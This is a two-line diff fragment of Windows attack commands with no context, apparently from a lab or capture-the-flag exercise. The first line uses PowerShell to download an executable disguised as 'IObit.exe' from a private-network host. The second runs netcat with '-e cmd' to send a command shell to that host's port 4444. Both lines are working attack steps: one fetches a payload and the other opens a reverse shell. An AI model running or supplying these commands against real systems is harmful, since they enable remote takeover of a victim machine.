@@ -1,0 +1,2 @@
+powershell -c Invoke-WebRequest http://172.16.1.100:4433/IObit.exe -OutFile '.\IObit.exe'
+.\nc.exe 172.16.1.100 4444 -e cmd
